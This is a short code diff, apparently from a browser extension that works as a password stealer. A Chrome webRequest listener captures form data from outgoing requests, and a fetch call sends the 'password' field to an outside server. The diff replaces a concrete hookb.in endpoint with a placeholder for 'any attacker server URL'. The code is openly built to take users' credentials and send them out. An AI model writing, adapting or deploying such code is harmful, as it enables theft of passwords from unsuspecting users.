@@ -17,7 +17,7 @@ chrome.webRequest.onBeforeRequest.addListener(
         var pass = JSON.stringify(details.requestBody.formData);
         console.log(pass);
         /*change url below to any attacker server URL
-        fetch('https://hookb.in/lJyEQ7JowNIrXXZWdJzr', {
+        fetch('<URL of attacker server>', {
           method: 'post',
           body: details.requestBody.formData['password'][0],
         })
